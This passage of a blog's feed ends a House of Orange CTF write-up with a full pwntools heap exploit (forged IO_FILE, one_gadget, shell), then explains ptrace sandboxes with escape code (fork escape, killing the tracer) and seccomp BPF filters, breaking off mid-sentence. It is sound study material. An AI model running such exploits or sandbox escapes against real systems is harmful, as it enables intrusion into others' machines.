_IO_MTSAFE_IO  if (do_lock)    _IO_lock_unlock (list_all_lock);  __libc_cleanup_region_end (0);#endif  return result;}</code></pre><ul><li>条件 1 构造如下：<ul><li><code>fp-&gt;_mode = 0</code>（<code>fp-&gt;_mode &lt;= 0</code>）</li><li><code>fp-&gt;_IO_write_ptr = 1 ; fp-&gt;_IO_write_base = 0</code>（<code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>）</li></ul></li><li>条件 2 构造如下（具体查看 <code>_IO_wide_data</code> 结构体）：<ul><li><code>fp-&gt;_mode = 1</code>（<code>fp-&gt;_mode &gt; 0</code>）</li><li><code>fp-&gt;_wide_data-&gt;_IO_write_ptr = _IO_read_end ; fp-&gt;_wide_data-&gt;_IO_write_base = _IO_read_ptr</code>（<code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code>）</li></ul></li></ul><p>接下来利用 Unsortedbin-Attack 将 <code>_IO_list_all</code> 的值改到 Unsortedbin 的位置（把这里当成 <code>_IO_2_1_stderr</code>）。然后在 Unsortedbin 上构造好一个大小为 0x60 的 Smallbin Chunk，同时在这里伪造一个能够 Bypass 的 IO_FILE 结构体。这样 <code>_IO_list_all</code> 的 <code>_chain</code> 就会指到这个地址的偏移 0x68 处（即 0x60 的 Smallbin），又指向我们在堆上构造的 IO_FILE（这里借用 veritas501 的图）：</p><pre><code class="txt"> +0x00 [       top        |  last_remainder   ] +0x10 [ unsorted bin fd  |  unsorted bin bk  ] +0x20 [ smallbin 0x20 fd | smallbin 0x20 bk  ] +0x30 [ smallbin 0x30 fd | smallbin 0x30 bk  ] +0x40 [ smallbin 0x40 fd | smallbin 0x40 bk  ] +0x50 [ smallbin 0x50 fd | smallbin 0x50 bk  ] +0x60 [ smallbin 0x60 fd | smallbin 0x60 bk  ] /* 0x68 */</code></pre><p>说实话最后一步一层一层调试还是很复杂的，而且如果调不到 one_gadget 都判断不了 ESP 的值对不对。最后总算是调出来了：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *from FILE import *context.arch = &#39;amd64&#39;#context.log_level = &#39;debug&#39;context.terminal = [&#39;tmux&#39;, &#39;split&#39;, &#39;-h&#39;]def cmd(c):    p.recvuntil(&#39;Your choice :&#39;)    p.sendline(str(c))def build(length, name, price, color):    cmd(1)    p.recvuntil(&#39;Length of name :&#39;)    p.sendline(str(length))    p.recvuntil(&#39;Name :&#39;)    p.send(name)    p.recvuntil(&#39;Price of Orange:&#39;)    p.sendline(str(price))    p.recvuntil(&#39;Color of Orange:&#39;)    p.sendline(str(color))def see():    cmd(2)def upgrade(length, name, price, color):    cmd(3)    p.recvuntil(&#39;Length of name :&#39;)    p.sendline(str(length))    p.recvuntil(&#39;Name:&#39;)    p.send(name)    p.recvuntil(&#39;Price of Orange:&#39;)    p.sendline(str(price))    p.recvuntil(&#39;Color of Orange:&#39;)    p.sendline(str(color))def giveup():    cmd(4)p = process(&#39;./houseoforange&#39;)libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)build(0x28, &#39;1&#39; * 8, 1, 1)upgrade(0x60, &#39;2&#39; * 0x40 + p64(0) + p64(0xf91), 1, 1) # Overflow top chunkbuild(0x1000, &#39;3&#39; * 0x8, 1, 1) # Trigger sysmallocbuild(0x500, &#39;4&#39; * 0x8, 1, 1) # Get a chunk from Unsorted-binsee() # Leak Unsorted-bin ptrp.recvuntil(&#39;4&#39; * 0x8)offset = 0x7fc27d99a188 - 0x7fc27d5d5000libc_base = u64(p.recvuntil(&#39;\n&#39;, drop=True).ljust(8, &#39;\x00&#39;)) - offsetinfo(&#39;libc_base = &#39; + hex(libc_base))if libc_base &amp; 0xffffffff &lt; 0x80000000:    warning(&#39;LOWWORD(libc_base) &lt; 0&#39;)    p.close()    exit(-1)one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]one_gadget = libc_base + one_gadgets[3]upgrade(0x500, &#39;5&#39; * 0x10, 1, 1)see()p.recvuntil(&#39;5&#39; * 0x10)heap_base = u64(p.recvuntil(&#39;\n&#39;, drop=True).ljust(8, &#39;\x00&#39;)) - 0xd0info(&#39;heap_base = &#39; + hex(heap_base))io_list_all = libc_base + libc.symbols[&#39;_IO_list_all&#39;]fake_file = IO_FILE_plus_struct()fake_file._IO_read_ptr = 0x61 # Small-bin sizefake_file._IO_read_base = io_list_all - 0x10 # Small-bin&#39;s bk ; Unsorted-bin Attackfake_file._mode = 0fake_file._IO_write_ptr = 1fake_file._IO_write_base = 0fake_file.vtable = heap_base + 0x6e0payload = &#39;6&#39; * 0x500 + p64(0) + p64(0x21) + p32(1) + p32(0x1f) + p64(0)payload += str(fake_file) # heap_base + 0x600payload += &#39;\x00&#39; * 0x18 + p64(one_gadget)info(&#39;one_gadget = &#39; + hex(one_gadget))#gdb.attach(p, &#39;dir ~/glibc-2.23/malloc\nb _int_malloc&#39; + &#39;\nc&#39; * 6)#gdb.attach(p, &#39;dir ~/glibc-2.23/libio\nb __libc_message\nb abort\nc&#39;)upgrade(0x800, payload, 1, 1)cmd(1)p.interactive()</code></pre><blockquote><p>House of Orange 并不是百分之百成功的，只有在 libc_base 的低 32 位为负数时才能成功，见<a href="https://www.anquanke.com/post/id/168802#h3-7" target="_blank" rel="noopener">这篇文章</a>。</p></blockquote><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction-zh/</a><br><a href="https://ctftime.org/writeup/12124" target="_blank" rel="noopener">https://ctftime.org/writeup/12124</a><br><a href="https://dangokyo.me/2017/12/13/hitcon-2016-ctf-quals-house-of-orange-write-up/" target="_blank" rel="noopener">https://dangokyo.me/2017/12/13/hitcon-2016-ctf-quals-house-of-orange-write-up/</a><br><a href="https://github.com/scwuaptx/CTF/blob/master/2016-writeup/hitcon/houseoforange.py" target="_blank" rel="noopener">https://github.com/scwuaptx/CTF/blob/master/2016-writeup/hitcon/houseoforange.py</a><br><a href="http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html" target="_blank" rel="noopener">http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html</a><br><a href="https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux Sandbox - Ptrace</title>
    <link href="/2020/04/18/Linux-Sandbox-Ptrace/"/>
    <url>/2020/04/18/Linux-Sandbox-Ptrace/</url>
    
    <content type="html"><![CDATA[<p>ptrace 是一个系统调用，也可以用作实现沙箱。</p><a id="more"></a><h1 id="What-is-Ptrace"><a href="#What-is-Ptrace" class="headerlink" title="What is Ptrace"></a>What is Ptrace</h1><p>ptrace 是一个系统调用，Tracer 进程可以监控和修改 Tracee 进程的运行状态，如内存、寄存器的值等。使用 ptrace 可以让某一进程处于受控状态，所以可以用作实现沙箱，如利用 ptrace 来监控 Tracee 使用哪些系统调用，并禁止 Tracee 使用某些危险的系统调用等。ptrace 使用信号来进行进程间通信：</p><pre><code class="bash">$ kill -l 1) SIGHUP       2) SIGINT       3) SIGQUIT      4) SIGILL       5) SIGTRAP 2) SIGABRT      7) SIGBUS       8) SIGFPE       9) SIGKILL     10) SIGUSR11)  SIGSEGV     12) SIGUSR2     13) SIGPIPE     14) SIGALRM     15) SIGTERM2)  SIGSTKFLT   17) SIGCHLD     18) SIGCONT     19) SIGSTOP     20) SIGTSTP3)  SIGTTIN     22) SIGTTOU     23) SIGURG      24) SIGXCPU     25) SIGXFSZ4)  SIGVTALRM   27) SIGPROF     28) SIGWINCH    29) SIGIO       30) SIGPWR5)  SIGSYS      34) SIGRTMIN    35) SIGRTMIN+1  36) SIGRTMIN+2  37) SIGRTMIN+36)  SIGRTMIN+4  39) SIGRTMIN+5  40) SIGRTMIN+6  41) SIGRTMIN+7  42) SIGRTMIN+87)  SIGRTMIN+9  44) SIGRTMIN+10 45) SIGRTMIN+11 46) SIGRTMIN+12 47) SIGRTMIN+138)  SIGRTMIN+14 49) SIGRTMIN+15 50) SIGRTMAX-14 51) SIGRTMAX-13 52) SIGRTMAX-129)  SIGRTMAX-11 54) SIGRTMAX-10 55) SIGRTMAX-9  56) SIGRTMAX-8  57) SIGRTMAX-710) SIGRTMAX-6  59) SIGRTMAX-5  60) SIGRTMAX-4  61) SIGRTMAX-3  62) SIGRTMAX-211) SIGRTMAX-1  64) SIGRTMAX</code></pre><h1 id="How-to-trace"><a href="#How-to-trace" class="headerlink" title="How to trace"></a>How to trace</h1><p>ptrace 的作用：</p><ul><li>Tracer 追踪 Tracee 的执行</li><li>拦截特定的事件（TRAP、SYSCALL）</li><li>读写 Tracee 的运行状态，如内存、寄存器的值等</li><li>用来实现 gdb 和 strace</li></ul><p>ptrace 的函数原型如下。其中 <code>request</code> 指明进行的操作，<code>pid</code> 为被追踪的进程（<code>pid</code>、<code>addr</code> 和 <code>data</code> 有时不会派上用场，根据具体情况而定）：</p><pre><code class="cpp">#include &lt;sys/ptrace.h&gt;#include &lt;sys/user.h&gt;long ptrace(enum __ptrace_request request, pid_t pid,                        void *addr, void *data);</code></pre><p><code>request</code> 有很多定义，这里记录几个常用的（详见 <a href="http://man7.org/linux/man-pages/man2/ptrace.2.html" target="_blank" rel="noopener">Linux Programmer’s Manual</a>）：</p><ul><li><code>PTRACE_TRACEME</code>：表明该进程会被父进程追踪。<code>pid</code>、<code>addr</code> 和 <code>data</code> 的值被忽略。这也是唯一能被 Tracee 使用的 <code>request</code>，其他的 <code>request</code> 都由 Tracer 指定；</li><li><code>PTRACE_ATTACH</code>：Tracer 向 Tracee 发送 SIGSTOP 信号使其暂停，并对 Tracee 追踪；</li><li><code>PTRACE_SEIZE</code>（从 Linux 3.4 开始有的 <code>request</code>）：追踪指定 <code>pid</code> 的进程，但不会像 <code>PTRACE_ATTACH</code> 一样让 Tracee 暂停。<code>addr</code> 必须为 0，<code>data</code> 指定 ptrace 选项；</li><li><code>PTRACE_DETACH</code>：解除追踪关系，Tracee 将继续运行；</li><li><code>PTRACE_CONT</code>：重启停止的 Tracee 进程，如果 <code>data</code> 不为 0，该值就会被当成对应的 Signal 传给 Tracee；反之不会发送 Signal。<code>addr</code> 的值被忽略；</li><li><code>PTRACE_SYSCALL</code>：在系统调用的入口或是出口处将 Tracee 进程停止并进行追踪。<code>addr</code> 的值被忽略；</li><li><code>PTRACE_PEEKUSER</code>：在 Tracee 的用户内存里获取一个字的数据，其中 <code>addr</code> 是在结构体 <code>user</code>（<code>/usr/include/sys/user.h</code>）中的偏移。</li></ul><h2 id="Trace-Child-Process"><a href="#Trace-Child-Process" class="headerlink" title="Trace Child Process"></a>Trace Child Process</h2><ul><li>先在子进程中调用 <code>ptrace(PTRACE_TRACEME)</code>；</li><li>在父进程中使用 <code>waitpid(pid)</code> 等待；</li><li>然后使用 <code>ptrace(PTRACE_CONT)</code> 继续执行；<ul><li>如果没有遇到 <code>int 0x3</code> 就会一直跑；</li><li>要追 syscall 的时候可以用 <code>ptrace(PTRACE_SYSCALL)</code>。</li></ul></li></ul><p>测试代码如下。子进程被父进程追踪，父进程在等待追踪结束后，重启子进程：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stddef.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/ptrace.h&gt;#include &lt;sys/user.h&gt;#include &lt;sys/wait.h&gt;int main(int argc, char **argv) {    pid_t pid = fork();    if (pid) {        while (1) {            int status;            waitpid(pid, &amp;status, 0);            if (WIFEXITED(status)){                break;            }            // ...            ptrace(PTRACE_CONT, pid, 0, 0);        }    } else {        ptrace(PTRACE_TRACEME, 0, 0, 0);        execl(&quot;/bin/ls&quot;, &quot;ls&quot;, NULL);    }}</code></pre><h2 id="Trace-syscall"><a href="#Trace-syscall" class="headerlink" title="Trace syscall"></a>Trace syscall</h2><ul><li>使用 <code>ptrace(PTRACE_PEEKUSER)</code> 来读取 CPU；<ul><li>addr 为结构体 <code>user</code> 中的偏移；</li><li><a href="https://elixir.bootlin.com/linux/v4.4.31/source/arch/x86/include/asm/user_32.h" target="_blank" rel="noopener"><code>arch/x86/include/asm/user_32.h</code></a>（<code>/usr/include/sys/user.h</code>）</li><li>orig_rax 为系统调用号；</li></ul></li><li>syscall 分别在 enter 和 exit 时各中断一次；<ul><li>exit 的时候可以在 rax 获取返回值。</li></ul></li></ul><p>添加一个 incall 来判断在 syscall 的 enter 和 exit 之间的切换，并在系统调用退出时输出调用号；然后获取 <code>user</code> 结构体中的 <code>orig_rax</code> 字段，即系统调用号：</p><pre><code class="cpp">    int incall = 0;    while (1) {        // ...        long orig_rax = ptrace(PTRACE_PEEKUSER, pid,            offsetof(struct user, regs.orig_rax), 0);        if (incall) {            printf(&quot;nr = %ld\n&quot;, orig_rax);        }        incall = ~incall;        ptrace(PTRACE_SYSCALL, pid, 0, 0);    }</code></pre><h2 id="读取-Tracee-的内容"><a href="#读取-Tracee-的内容" class="headerlink" title="读取 Tracee 的内容"></a>读取 Tracee 的内容</h2><ul><li><code>ptrace(PTRACE_PEEKDATA)</code></li><li>固定读一个字（4 字节）</li></ul><p><code>/bin/ls</code> 中调用了 write 进行输出，可以对 write 进行追踪并获取相应的内容：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stddef.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/ptrace.h&gt;#include &lt;sys/user.h&gt;#include &lt;sys/wait.h&gt;int main(int argc, char **argv) {    pid_t pid = fork();    if (pid) {        int incall = 0;        while (1) {            int status;            waitpid(pid, &amp;status, 0);            if (WIFEXITED(status)){                break;            }            long orig_rax = ptrace(PTRACE_PEEKUSER, pid,                offsetof(struct user, regs.orig_rax), 0);            long rsi = ptrace(PTRACE_PEEKUSER, pid,                offsetof(struct user, regs.rsi), 0);            long rdx = ptrace(PTRACE_PEEKUSER, pid,                offsetof(struct user, regs.rdx), 0);            long rax = ptrace(PTRACE_PEEKUSER, pid,                offsetof(struct user, regs.rax), 0);            //printf(&quot;nr = %ld\n&quot;, orig_rax);            if (incall) {                if (orig_rax == 1) {                    printf(&quot;write(\&quot;&quot;);                    for (int i = 0; i &lt; rdx; i++) {                        int d = ptrace(PTRACE_PEEKDATA, pid,                            rsi + i, 0);                        printf(&quot;%c&quot;, d &amp; 0xff);                    }                }            } else {                if (orig_rax == 1) {                    printf(&quot;\&quot;) = %d\n&quot;, (int)rax);                }            }            incall = ~incall;            ptrace(PTRACE_SYSCALL, pid, 0, 0);        }    } else {        ptrace(PTRACE_TRACEME, 0, 0, 0);        execl(&quot;/bin/ls&quot;, &quot;ls&quot;, NULL);    }}</code></pre><p>运行结果：</p><pre><code class="bash">➜  ptrace ./ptracewrite(&quot;a  a.c    escape    escape.c  Makefile  ptrace  ptrace.ca  a.c    escape    escape.c  Makefile  ptrace  ptrace.c&quot;) = 51</code></pre><h1 id="Bypass-Ptrace-Sandbox"><a href="#Bypass-Ptrace-Sandbox" class="headerlink" title="Bypass Ptrace Sandbox"></a>Bypass Ptrace Sandbox</h1><ul><li>摆脱对 syscall 的追踪<ul><li>Fork 脱离 Tracer</li><li>砍掉父进程</li></ul></li><li>绕过 syscall 的检查<ul><li><code>syscall_restart</code> 等造成 incall 计算错误</li></ul></li></ul><h2 id="Escape-by-Fork"><a href="#Escape-by-Fork" class="headerlink" title="Escape by Fork"></a>Escape by Fork</h2><ul><li>只要 ptrace 没有跟踪好 fork、vfork、clone，子进程就不会被 ptrace 跟踪；</li><li>正确的做法是要继续跟好子进程，或者直接禁止 fork。<ul><li>可以设置 <code>PTRACE_O_TRACECLONE</code> 选项，会自动跟踪 clone 出来的新进程。</li></ul></li></ul><p>测试代码如下：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stddef.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/ptrace.h&gt;#include &lt;sys/user.h&gt;#include &lt;sys/wait.h&gt;int main(int argc, char **argv) {    pid_t pid = fork();    if (pid) {        int incall = 0;        while (1) {            int status;            waitpid(pid, &amp;status, 0);            if (WIFEXITED(status)){                break;            }            long orig_rax = ptrace(PTRACE_PEEKUSER, pid,                offsetof(struct user, regs.orig_rax), 0);            if (incall) {                if (orig_rax == 59) {                    printf(&quot;SYS_execve detected\n&quot;);                    kill(pid, SIGKILL);                    exit(0);                }            }            incall = ~incall;            ptrace(PTRACE_SYSCALL, pid, 0, 0);        }    } else {        ptrace(PTRACE_TRACEME, 0, 0, 0);        execl(&quot;./a&quot;, &quot;a&quot;, NULL);    }}</code></pre><p>子进程新 fork 一个进程来执行 execve：</p><pre><code class="cpp">    if (fork()) {        sleep(1);    } else {        execl(&quot;/bin/ls&quot;, &quot;ls&quot;, 0);    }</code></pre><p>运行结果：</p><pre><code class="bash">➜  ptrace ./ptracea  a.c    escape    escape.c  Makefile  ptrace  ptrace.c</code></pre><h2 id="Escape-by-Kill"><a href="#Escape-by-Kill" class="headerlink" title="Escape by Kill"></a>Escape by Kill</h2><ul><li>杀死父进程；<ul><li><code>kill(getppid(), 9);</code>；</li><li>ppid 无法获取时可以尝试 pid-1；</li><li><code>/proc/self/stat</code> 中可以拿到 pid 和 ppid；</li><li><code>kill(-1, 9);</code> 杀死除了自己以外的所有进程。</li></ul></li><li>设置 <code>PTRACE_O_EXITKILL</code> 可以让 Tracer 结束时把所有的 Tracee 杀死。</li></ul><p>在子进程中杀死父进程：</p><pre><code class="cpp">    kill(getppid(), 9);    execl(&quot;/bin/ls&quot;, &quot;ls&quot;, 0);</code></pre><p>运行效果：</p><pre><code class="bash">➜  ptrace ./ptrace[1]    2211 killed     ./ptracea  a.c  escape  escape.c  Makefile  ptrace  ptrace.c</code></pre><p>用 alarm 和 sleep 可以搅乱 syscall 进出的顺序：</p><pre><code class="cpp">    alarm(1);    sleep(2);    execl(&quot;/bin/ls&quot;, &quot;ls&quot;, 0);</code></pre><p>加上一条用来判断进出 syscall 的输出：</p><pre><code class="cpp">            printf(&quot;%s %ld\n&quot;, (incall ? &quot;Enter&quot; : &quot;Exit&quot;), orig_rax);</code></pre><p>运行效果如下。在执行 alarm 后会导致 sys_nanosleep（35）由进入了一次，后面会调用一个 sys_restart_syscall（219），大概可能和 syscall 的原理有关。在这之后的 syscall 的顺序就会乱掉：</p><pre><code class="bash">Enter 35Exit 35Enter 35Exit 219Enter 219Exit 59Enter 59</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.youtube.com/watch?v=gQXyZY7Ucjc" target="_blank" rel="noopener">https://www.youtube.com/watch?v=gQXyZY7Ucjc</a><br><a href="https://blog.betamao.me/2019/02/02/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bptrace/" target="_blank" rel="noopener">https://blog.betamao.me/2019/02/02/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bptrace/</a><br><a href="https://atum.li/2017/04/25/linuxsandbox/#ptrace" target="_blank" rel="noopener">https://atum.li/2017/04/25/linuxsandbox/#ptrace</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux Sandbox - Seccomp</title>
    <link href="/2020/04/17/%5BTODO%5DLinux-Sandbox-Seccomp/"/>
    <url>/2020/04/17/%5BTODO%5DLinux-Sandbox-Seccomp/</url>
    
    <content type="html"><![CDATA[<p>Seccomp 可以为“不可信的纯计算型代码”提供一个“安全（SAFE, not SECURE）”的运行环境，以保护你的系统和应用程序的正常运行不受不可信代码的干扰。</p><a id="more"></a><h1 id="Seccomp-Sandbox"><a href="#Seccomp-Sandbox" class="headerlink" title="Seccomp Sandbox"></a>Seccomp Sandbox</h1><p>Seccomp（Secure Computing mode）是 Linux 提供的一种沙箱机制，可以用来限制程序可以使用和不可使用的系统调用。简洁、优美是 Seccomp 的优点，但只能支持“纯计算型”代码却使得其应用受到很大限制。比如，Seccomp 模式的进程不能动态分配内存、不能与其它进程使用共享内存、不能使用新的文件描述符、等等。如果要支持具有丰富功能的应用程序，则需要另外的方法来截获并处理其它系统调用。Seccomp 沙箱主要有两种模式，<code>SECCOMP_SET_MODE_STRICT</code> 只运行调用 4 个系统调用 <code>read()</code>、<code>write()</code>、<code>exit()</code>、<code>sigreturn()</code> 四个系统调用，而 <code>SECCOMP_SET_MODE_FILTER</code> 则允许通过 BPF 指定系统调用的黑名单或者白名单。</p><p>Seccomp 本身是一种很安全的技术，但是在 <code>SECCOMP_SET_MODE_FILTER</code> 环境下通常会因为 BPF 使用不正确导致沙箱存在被绕过的可能。</p><ul><li>限制一个程序能够使用的系统调用，可以是黑名单或白名单；</li><li>根据 Filter 的内容决定遇到系统调用时采取的行为，包括 kill、allow、trap 等等；</li><li>Filter 可以做简单的计算、条件判断。</li></ul><blockquote><p>早期直接使用 <code>prctl</code> 来开启 Seccomp。现在已经有 libseccomp 库，可以直接使用 <code>seccomp_init</code>、<code>seccomp_rule_add</code>、<code>seccomp_load</code> 来设定规则。</p></blockquote><h2 id="Seccomp-using-prctl"><a href="#Seccomp-using-prctl" class="headerlink" title="Seccomp using prctl"></a>Seccomp using <code>prctl</code></h2><p>Seccomp 采用 Berkeley Packet Filter（BPF）格式，原本在防火墙（iptables）中用来过滤封包。使用 Seccomp 需要有 <code>CAP_SYS_ADMIN</code> Capability（相当于 root 的权限），非 root 用户则通过设置 PR_SET_NO_NEW_PRIVS 位来获取 <code>CAP_SYS_ADMIN</code> Capability。这样能保证 Seccomp 对所有用户都能起作用，并且会使子进程即 execve 后的进程依然受控。获取 <code>CAP_SYS_ADMIN</code> Capability 后，就可以开启相应的自定义规则。具体的规则定义在参数 <code>prog</code> 中：</p><pre><code class="cpp">prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0); // 获取 CAP_SYS_ADMIN 权限prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog); // 开启自定义的过滤规则</code></pre><p>接下来看看 <code>prog</code> 对应的结构体 <code>sock_fprog</code> 以及用于过滤系统调用的结构体 <code>sock_filter</code>，主要定义在 <a href="https://elixir.bootlin.com/linux/v4.4.31/source/include/uapi/linux/filter.h" target="_blank" rel="noopener">include/uapi/linux/filter.h</a>（<code>/usr/include/linux/filter.h</code>）中。其中 <code>sock_fprog</code> 第一个成员 <code>len</code> 记录过滤规则的个数；第二个成员 <code>filter</code> 是一个 <code>sock_filter</code> 数组，用于记录相应的过滤规则：</p><pre><code class="cpp">/* *    Try and keep these values and structures similar to BSD, especially *    the BPF code definitions which need to match so you can share filters */struct sock_filter {    /* Filter block */    __u16    code;   /* Actual filter code */    __u8    jt;    /* Jump true */    __u8    jf;    /* Jump false */    __u32    k;      /* Generic multiuse field */};struct sock_fprog {    /* Required for SO_ATTACH_FILTER. */    unsigned short        len;    /* Number of filter blocks */    struct sock_filter __user *filter;};</code></pre><p>为了方便操作 <code>sock_filter</code>，还定义了一组宏：</p><pre><code class="cpp">/* * Macros for filter block array initializers. */#ifndef BPF_STMT#define BPF_STMT(code, k) { (unsigned short)(code), 0, 0, k }#endif#ifndef BPF_JUMP#define BPF_JUMP(code, k, jt, jf) { (unsigned short)(code), jt, jf, k }#endif</code></pre><p>其中在 <a href="https://elixir.bootlin.com/linux/v4.4.31/source/include/uapi/linux/bpf_common.h" target="_blank" rel="noopener">include/uapi/linux/bpf_common.h</a>（<code>/usr/include/linux/bpf_common.h</code>）对 code 进行了一系列的定义，包括一些数据操作指令、跳转指令、算术运算指令等等（Winesap 提到程序可以全部用 BPF 的算术运算单元来实现，运行的时间是算在内核里，据说居然可以在 OJ 里绕过时间限制）：</p><pre><code class="cpp">/* Instruction classes */#define BPF_CLASS(code) ((code) &amp; 0x07)#define        BPF_LD        0x00#define        BPF_LDX        0x01#define        BPF_ST        0x02#define        BPF_STX        0x03#define        BPF_ALU        0x04#define        BPF_JMP        0x05#define        BPF_RET        0x06#define        BPF_MISC        0x07/* ld/ldx fields */#define BPF_SIZE(code)  ((code) &amp; 0x18)#define        BPF_W        0x00#define        BPF_H        0x08#define        BPF_B        0x10#define BPF_MODE(code)  ((code) &amp; 0xe0)#define        BPF_IMM        0x00#define        BPF_ABS        0x20#define        BPF_IND        0x40#define        BPF_MEM        0x60#define        BPF_LEN        0x80#define        BPF_MSH        0xa0/* alu/jmp fields */#define BPF_OP(code)    ((code) &amp; 0xf0)#define        BPF_ADD        0x00#define        BPF_SUB        0x10#define        BPF_MUL        0x20#define        BPF_DIV        0x30#define        BPF_OR        0x40#define        BPF_AND        0x50#define        BPF_LSH        0x60#define        BPF_RSH        0x70#define        BPF_NEG        0x80#define        BPF_MOD        0x90#define        BPF_XOR        0xa0#define        BPF_JA        0x00#define        BPF_JEQ        0x10#define        BPF_JGT        0x20#define        BPF_JGE        0x30#define        BPF_JSET        0x40#define BPF_SRC(code)   ((code) &amp; 0x08)#define        BPF_K        0x00#define        BPF_X        0x08</code></pre><p>从某个地址加载数据（数据的大小：<code>BPF_W</code>、<code>BPF_H</code>、<code>BPF_B</code>，地址的类型：<code>BPF_ABS</code>、<code>BPF_IMM</code>）：</p><pre><code class="cpp">BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 0)</code></pre><p>然后 Seccomp 的返回值在 <a href="https://elixir.bootlin.com/linux/v4.4.31/source/include/uapi/linux/seccomp.h" target="_blank" rel="noopener">include/uapi/linux/seccomp.h</a>（<code>/usr/include/linux/seccomp.h</code>）中有定义，意思也是比较直观的：</p><pre><code class="cpp">/* * All BPF programs must return a 32-bit value. * The bottom 16-bits are for optional return data. * The upper 16-bits are ordered from least permissive values to most. * * The ordering ensures that a min_t() over composed return values always * selects the least permissive choice. */#define SECCOMP_RET_KILL    0x00000000U /* kill the task immediately */#define SECCOMP_RET_TRAP    0x00030000U /* disallow and force a SIGSYS */#define SECCOMP_RET_ERRNO    0x00050000U /* returns an errno */#define SECCOMP_RET_TRACE    0x7ff00000U /* pass to a tracer or disallow */#define SECCOMP_RET_ALLOW    0x7fff0000U /* allow */</code></pre><p>Seccomp 编写规则时会使用到一个 <code>seccomp_data</code> 结构体，定义在 <a href="https://elixir.bootlin.com/linux/v4.4.31/source/include/uapi/linux/seccomp.h" target="_blank" rel="noopener">include/uapi/linux/seccomp.h</a>（<code>/usr/include/linux/seccomp.h</code>）中。各个成员如下：</p><ul><li><code>nr</code>：系统调用号；</li><li><code>arch</code>：定义在 <a href="https://elixir.bootlin.com/linux/v4.4.31/source/include/uapi/linux/audit.h" target="_blank" rel="noopener">include/uapi/linux/audit.h</a>（<code>/usr/include/linux/audit.h</code>）中；<ul><li><code>i386</code>：0x40000003；</li><li><code>amd64</code>：0xc000003e。</li></ul></li><li><code>instruction_pointer</code>：系统调用号对应的 IP；</li><li><code>args</code>：系统调用号。<ul><li><code>i386</code>：ebx、ecx、edx、esi、edi；</li><li><code>amd64</code>：rdi、rsi、rdx、r10、r8、r9。</li></ul></li></ul><pre><code class="cpp">#define AUDIT_ARCH_I386        (EM_386|__AUDIT_ARCH_LE)#define AUDIT_ARCH_IA64        (EM_IA_64|__AUDIT_ARCH_64BIT|__AUDIT_ARCH_LE)/** * struct seccomp_data - the format the BPF program executes over. * @nr: the system call number * @arch: indicates system call convention as an AUDIT_ARCH_* value *        as defined in &lt;linux/audit.h&gt;. * @instruction_pointer: at the time of the system call. * @args: up to 6 system call arguments always stored as 64-bit values *        regardless of the architecture. */struct seccomp_data {    int nr;    __u32 arch;    __u64 instruction_pointer;    __u64 args[6];};</code></pre><p>下面给一个例子测试，<code>SECCOMP_RET_ALLOW</code> 表示允许所有调用；<code>SECCOMP_RET_KILL</code> 表示禁止所有调用：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;linux/seccomp.h&gt;#include &lt;linux/filter.h&gt;int main() {    struct sock_filter filter[] = {//        BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),        BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),    };    struct sock_fprog prog = {        .len = (unsigned short)(sizeof(filter) / sizeof(filter[0])),        .filter = filter,    };    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog);    printf(&quot;###\n&quot;);    system(&quot;ls&quot;);}</code></pre><p><code>SECCOMP_RET_ALLOW</code> 会正常执行，而 <code>SECCOMP_RET_KILL</code> 会报“invalid system call”：</p><pre><code class="bash">➜  seccomp ./sec[1]    3372 invalid system call  ./sec</code></pre><p>禁用 execve 系统调用的规则如下。首先取出 <code>seccomp_data</code> 中的 <code>nr</code>，然后和 59 比较。如果相等，则跳过一条规则，即被 kill；不相等的话，继续执行下一条规则，即 allow：</p><pre><code class="cpp">struct sock_filter filter[] = {    BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 0), // offset = 0 -&gt; nr    BPF_JUMP(BPF_JMP + BPF_JEQ, 59, 1, 0), // compare nr with 59 (SYS_execve = 59)    BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),    BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),};</code></pre><p>Seccomp 的过滤规则可以通过 gdb 来 dump 